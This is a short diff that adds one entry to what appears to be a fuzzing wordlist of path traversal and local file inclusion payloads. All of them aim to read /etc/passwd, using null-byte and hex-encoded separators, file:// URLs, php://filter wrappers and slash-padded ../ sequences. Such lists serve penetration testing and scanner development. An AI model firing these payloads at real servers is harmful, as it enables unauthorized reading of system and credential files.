@@ -12,6 +12,7 @@ file:///etc/passwd
 .%00./.%00./etc/passwd
 .%00.\.%00.\etc\passwd
 php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+//////////////////../../../../../../../../etc/passwd
 .%00.0x2f.%00.0x2f.%00.0x2f.%00.0x2f.%00.0x2f.%00.0x2fetc0x2fpasswd
 .%00.0x2f.%00.0x2f.%00.0x2f.%00.0x2f.%00.0x2fetc0x2fpasswd
 .%00.0x2f.%00.0x2f.%00.0x2f.%00.0x2fetc0x2fpasswd
